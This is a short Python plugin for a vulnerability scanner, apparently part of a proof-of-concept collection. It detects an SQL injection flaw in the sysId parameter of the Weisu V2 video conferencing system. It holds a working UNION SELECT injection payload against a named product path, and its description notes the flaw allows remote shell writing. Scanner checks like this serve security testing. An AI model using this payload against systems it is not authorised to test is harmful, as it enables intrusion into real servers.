# -*-* coding:UTF-8
import hashlib


class Plugin(Base):
    __info__ = {
        "author": "doimet",
        "references": ["-"],
        "name": "威速V2视频会议系统存在SQL注入漏洞",
        "description": "威速V2视频会议系统sysId参数存在SQL命令执行漏洞。允许攻击者远程写入shell，获得服务器权限",
        "datetime": "2022-02-19"
    }

    def url(self) -> dict:
        random_int = self.build_random_int(12)
        flag = hashlib.md5(random_int.encode()).hexdigest()
        r = self.request(
            method='get',
            path=f'./Conf/jsp/systembulletin/bulletinAction.do?operator=details&sysId=- 1%20union%20select%201,md5({random_int}),3,4,5%23',
            timeout=15
        )
        if r.status_code == 200 and flag in r.text:
            return {
                "LoopholeInfo": {"app": "威速V2", "name": "威速V2视频会议系统存在SQL注入漏洞"}
            }
